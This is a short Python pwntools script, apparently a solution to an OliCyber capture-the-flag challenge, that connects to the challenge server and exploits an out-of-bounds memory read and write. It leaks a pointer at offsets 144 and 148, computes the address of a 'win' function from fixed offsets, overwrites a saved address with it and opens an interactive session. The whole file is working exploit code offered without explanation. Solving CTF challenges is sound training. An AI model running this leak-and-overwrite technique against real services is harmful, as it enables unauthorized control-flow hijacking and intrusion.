from pwn import *
from Crypto.Util.number import long_to_bytes, bytes_to_long

r = remote("fritto-disordinato.challs.olicyber.it", 33001)

ret = []

for i in range(2):
    r.recvuntil(b">")
    r.sendline(b"1")
    r.recvline()
    r.sendline(str(144+i*4))
    r.recvuntil(b": ")
    ret.append(int(r.recvline()))

print(ret)
ret = p32(ret[0]) + p32(ret[1])
print(ret)
winAddr = bytes_to_long(ret) - 0x9690 + 0x99A0
print(winAddr)

r.sendline(b"0")
r.recvline()
r.sendline(b"144")
r.recvline()
r.sendline(p64(winAddr))

r.interactive()
